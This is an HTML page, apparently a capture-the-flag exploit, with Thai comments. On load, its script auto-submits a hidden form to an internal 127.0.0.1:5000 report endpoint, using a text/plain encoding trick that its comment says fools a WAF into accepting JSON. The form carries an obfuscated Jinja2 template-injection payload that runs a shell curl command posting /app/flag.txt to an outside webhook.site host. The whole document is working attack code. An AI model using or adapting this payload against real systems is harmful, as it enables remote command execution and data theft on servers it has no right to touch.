<html>
  <body>
<script>
  const payload = `{{ get_flashed_messages|attr("\\x5f\\x5fglobals\\x5f\\x5f")|attr("get")("\\x6fs")|attr("\\x70open")("curl -X POST -d @/app/flag.txt https://webhook.site/c8b5eb75-9989-4b28-8dfa-6b11ee60562f")|attr("read")() }}`;

  // สร้าง Form เพื่อยิง POST ไปยังภายใน
  const form = document.createElement('form');
  form.method = 'POST';
  form.action = 'http://127.0.0.1:5000/api/reports/generate';
  
  // เนื่องจากเราต้องส่ง JSON แต่ HTML Form ปกติส่ง JSON ไม่ได้ 
  // เราจะใช้เทคนิค text/plain เพื่อหลอก WAF และส่งโครงสร้าง JSON ออกไป
  form.enctype = 'text/plain'; 
  
  const input = document.createElement('input');
  input.name = `{"template": "${payload}", "dummy": "`;
  input.value = `"}`;
  
  form.appendChild(input);
  document.body.appendChild(form);
  form.submit();
</script>
  </body>
</html>
